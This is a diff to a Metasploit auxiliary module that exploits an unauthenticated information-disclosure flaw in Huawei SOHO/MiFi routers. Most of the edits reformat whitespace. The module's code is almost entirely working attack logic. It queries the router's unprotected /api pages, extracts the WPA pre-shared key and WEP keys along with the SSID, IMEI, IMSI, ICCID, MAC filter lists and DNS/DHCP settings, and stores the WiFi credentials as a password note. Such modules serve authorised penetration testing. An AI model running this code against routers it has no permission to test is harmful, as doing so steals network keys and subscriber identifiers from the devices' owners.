@@ -14,15 +14,16 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => "Huawei Datacard, Information Disclosure Vulnerability",
       'Description'    => %q{
-          This module exploits an un-authenticated information disclosure vulnerability ("Direct Request", CWE-425)
-          	in Huawei SOHO routers. The module will gather information by accessing the /api pages where 
-		authentication is not required.
+          This module exploits an un-authenticated information disclosure vulnerability (CWE-425) in Huawei
+        SOHO routers. The module will gather information by accessing the /api pages where
+        authentication is not required, allowing configuration changes
+        as well as information disclosure including any stored SMS.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
           'Jimson K James.',
-		  'tomsmaily [at] aczire.com',  #Msf module
+          'tomsmaily [at] aczire.com',  #Msf module
         ],
       'References'     =>
         [
@@ -31,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
           [ 'URL', 'http://www.huaweidevice.co.in/Support/Downloads/' ],
         ],
       'DisclosureDate' => "Nov 11 2013" ))
-	  
+
     register_options(
       [
         Opt::RHOST("mobilewifi.home")
@@ -41,17 +42,17 @@ class Metasploit3 < Msf::Auxiliary
 
 def run
 
-	#Gather basic router information
-	get_router_info	
-	print_status("")
-	get_router_mac_filter_info
-	print_status("")
-	get_router_wan_info
-	print_status("")
-	get_router_dhcp_info
-	print_status("")
-	
-	print_status("Now trying to get WiFi Key details...")
+    #Gather basic router information
+    get_router_info
+    print_status("")
+    get_router_mac_filter_info
+    print_status("")
+    get_router_wan_info
+    print_status("")
+    get_router_dhcp_info
+    print_status("")
+
+    print_status("Now trying to get WiFi Key details...")
     res = send_request_raw(
     {
       'method'  => 'GET',
@@ -77,11 +78,11 @@ def run
     end
 
     print_status("---===[ WiFi Key Details ]===---")
-	
-	wifissid = get_router_ssid	
-	if wifissid
-		print_status("WiFi SSID: #{wifissid}")
-	end
+
+    wifissid = get_router_ssid
+    if wifissid
+        print_status("WiFi SSID: #{wifissid}")
+    end
 
     # Grabbing the wifiwpapsk
     if res.body.match(/<WifiWpapsk>(.*)<\/WifiWpapsk>/i)
@@ -94,54 +95,54 @@ def run
       wifiauthmode = $1
       print_status("Wifi Auth mode: #{wifiauthmode}")
     end
-	
+
     # Grabbing the WifiBasicencryptionmodes
     if res.body.match(/<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i)
       wifibasicencryptionmodes = $1
       print_status("Wifi Basic encryption modes: #{wifibasicencryptionmodes}")
-    end	
-	
+    end
+
     # Grabbing the WifiWpaencryptionmodes
     if res.body.match(/<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i)
       wifiwpaencryptionmodes = $1
       print_status("Wifi WPA Encryption Modes: #{wifiwpaencryptionmodes}")
     end
-	
+
     # Grabbing the WifiWepKey1
     if res.body.match(/<WifiWepKey1>(.*)<\/WifiWepKey1>/i)
       wifiwepkey1 = $1
       print_status("Wifi WEP Key1: #{wifiwepkey1}")
     end
-	
+
     # Grabbing the WifiWepKey2
     if res.body.match(/<WifiWepKey2>(.*)<\/WifiWepKey2>/i)
       wifiwepkey2 = $1
       print_status("Wifi WEP Key2: #{wifiwepkey2}")
-    end	
-	
+    end
+
     # Grabbing the WifiWepKey3
     if res.body.match(/<WifiWepKey3>(.*)<\/WifiWepKey3>/i)
       wifiwepkey3 = $1
       print_status("Wifi WEP Key3: #{wifiwepkey3}")
     end
-	
+
     # Grabbing the WifiWepKey4
     if res.body.match(/<WifiWepKey4>(.*)<\/WifiWepKey4>/i)
       wifiwepkey4 = $1
       print_status("Wifi WEP Key4: #{wifiwepkey4}")
-    end		
-	
+    end
+
     # Grabbing the WifiWepKeyIndex
     if res.body.match(/<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i)
       wifiwepkeyindex = $1
       print_status("Wifi WEP Key Index: #{wifiwepkeyindex}")
     end
-	
+
     credentials = Rex::Ui::Text::Table.new(
-    'Header'    	=> "\n Huawei MiFi Credentials",
-    'HeaderIndent'	=> 1,
-    'Indent'    	=> 1,
-    'Columns'   	=>
+    'Header'        => "\n Huawei MiFi Credentials",
+    'HeaderIndent'  => 1,
+    'Indent'        => 1,
+    'Columns'       =>
     [
       "Access Point",
       "SSID",
@@ -149,19 +150,19 @@ def run
       "802.11 Authentication",
       "Encryption Mode",
       "WEP Key"
-    ])	
-	
+    ])
+
     credentials << [rhost, wifissid, wifiwpapsk, wifiauthmode, wifiwpaencryptionmodes, wifiwepkey1]
 
     report_note(
-	:host => rhost,
-	:type => 'password',
-	:data => credentials
-    )	
-	
+        :host => rhost,
+        :type => 'password',
+        :data => credentials
+    )
+
    rescue::Exception => e
-	 print_status("Ooooops: #{e.class} #{e}")	
-   
+     print_status("Ooooops: #{e.class} #{e}")
+
    #end run
   end
 
@@ -209,66 +210,66 @@ def get_router_info
       serialnumber = $1
       print_status("Serial Number: #{serialnumber}")
     end
-	
+
     # Grabbing the IMEI
     if res.body.match(/<Imei>(.*)<\/Imei>/i)
       imei = $1
       print_status("IMEI: #{imei}")
-    end	
-	
+    end
+
     # Grabbing the IMSI
     if res.body.match(/<Imsi>(.*)<\/Imsi>/i)
       imsi = $1
       print_status("IMSI: #{imsi}")
-    end	
-	
+    end
+
     # Grabbing the ICCID
     if res.body.match(/<Iccid>(.*)<\/Iccid>/i)
       iccid = $1
       print_status("ICCID: #{imsi}")
-    end		
-	
+    end
+
     # Grabbing the HardwareVersion
     if res.body.match(/<HardwareVersion>(.*)<\/HardwareVersion>/i)
       hardwareversion = $1
       print_status("Hardware Version: #{hardwareversion}")
     end
-	
+
     # Grabbing the SoftwareVersion
     if res.body.match(/<SoftwareVersion>(.*)<\/SoftwareVersion>/i)
       softwareversion = $1
       print_status("Software Version: #{softwareversion}")
     end
-	
+
     # Grabbing the WebUIVersion
     if res.body.match(/<WebUIVersion>(.*)<\/WebUIVersion>/i)
       webuiversion = $1
       print_status("WebUI Version: #{webuiversion}")
-    end	
-	
+    end
+
     # Grabbing the MacAddress1
     if res.body.match(/<MacAddress1>(.*)<\/MacAddress1>/i)
       macaddress1 = $1
       print_status("Mac Address1: #{macaddress1}")
     end
-	
+
     # Grabbing the MacAddress2
     if res.body.match(/<MacAddress2>(.*)<\/MacAddress2>/i)
       macaddress2 = $1
       print_status("Mac Address2: #{macaddress2}")
-    end		
-	
+    end
+
     # Grabbing the ProductFamily
     if res.body.match(/<ProductFamily>(.*)<\/ProductFamily>/i)
       productfamily = $1
       print_status("Product Family: #{productfamily}")
-    end		
+    end
 
     # Grabbing the Classification
     if res.body.match(/<Classify>(.*)<\/Classify>/i)
       classification = $1
       print_status("Classification: #{classification}")
-    end		
+    end
   end
 
 def get_router_ssid
@@ -301,11 +302,11 @@ def get_router_ssid
     # Grabbing the Wifi SSID
     if res.body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
       ssid = $1
-	  #print_status("SSID #{ssid}")
-	  return $1
-    end	
+      #print_status("SSID #{ssid}")
+      return $1
+    end
 end
-  
+
 def get_router_mac_filter_info
 
     res = send_request_raw(
@@ -337,82 +338,82 @@ def get_router_mac_filter_info
     # Grabbing the WifiMacFilterStatus
     if res.body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
       wifimacfilterstatus = $1
-	  print_status("Wifi MAC Filter Status: #{(wifimacfilterstatus == "1") ? "ENABLED" : "DISABLED"}" )
+      print_status("Wifi MAC Filter Status: #{(wifimacfilterstatus == "1") ? "ENABLED" : "DISABLED"}" )
     end
 
     # Grabbing the WifiMacFilterMac0
     if res.body.match(/<WifiMacFilterMac0>(.*)<\/WifiMacFilterMac0>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
-	
+
     # Grabbing the WifiMacFilterMac1
     if res.body.match(/<WifiMacFilterMac1>(.*)<\/WifiMacFilterMac1>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac2
     if res.body.match(/<WifiMacFilterMac2>(.*)<\/WifiMacFilterMac2>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac3
     if res.body.match(/<WifiMacFilterMac3>(.*)<\/WifiMacFilterMac3>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac4
     if res.body.match(/<WifiMacFilterMac4>(.*)<\/WifiMacFilterMac4>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac5
     if res.body.match(/<WifiMacFilterMac5>(.*)<\/WifiMacFilterMac5>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac6
     if res.body.match(/<WifiMacFilterMac6>(.*)<\/WifiMacFilterMac6>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac7
     if res.body.match(/<WifiMacFilterMac7>(.*)<\/WifiMacFilterMac7>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac8
     if res.body.match(/<WifiMacFilterMac8>(.*)<\/WifiMacFilterMac8>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
     # Grabbing the WifiMacFilterMac9
     if res.body.match(/<WifiMacFilterMac9>(.*)<\/WifiMacFilterMac9>/i)
       wifimacfiltermac = $1
-	  if !(wifimacfiltermac == "")
-		print_status("Mac: #{wifimacfiltermac}")
-	  end
+      if !(wifimacfiltermac == "")
+        print_status("Mac: #{wifimacfiltermac}")
+      end
     end
   end
-  
+
 def get_router_wan_info
 
     res = send_request_raw(
@@ -452,15 +453,15 @@ def get_router_wan_info
       primarydns = $1
       print_status("Primary Dns: #{primarydns}")
     end
-	
+
     # Grabbing the SecondaryDns
     if res.body.match(/<SecondaryDns>(.*)<\/SecondaryDns>/i)
       secondarydns = $1
       print_status("Secondary Dns: #{secondarydns}")
-    end	
+    end
 
   end
- 
+
 def get_router_dhcp_info
 
     res = send_request_raw(
@@ -500,29 +501,29 @@ def get_router_dhcp_info
       dhcpstatus = $1
       print_status("DHCP: #{(dhcpstatus=="1") ? "ENABLED" : "DISABLED"}")
     end
-	
-	if (dhcpstatus != "1")
-		return
-	end
-    
-	# Grabbing the DhcpStartIPAddress
+
+    if (dhcpstatus != "1")
+        return
+    end
+
+    # Grabbing the DhcpStartIPAddress
     if res.body.match(/<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i)
       dhcpstartipaddress = $1
       print_status("DHCP StartIPAddress: #{dhcpstartipaddress}")
-    end	
-	
+    end
+
     # Grabbing the DhcpEndIPAddress
     if res.body.match(/<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i)
       dhcpendipaddress = $1
       print_status("DHCP EndIPAddress: #{dhcpendipaddress}")
-    end	
+    end
 
     # Grabbing the DhcpLeaseTime
     if res.body.match(/<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i)
       dhcpleasetime = $1
       print_status("DHCP Lease Time: #{dhcpleasetime}")
-    end		
+    end
   end
 
-#end module  
+#end module
 end
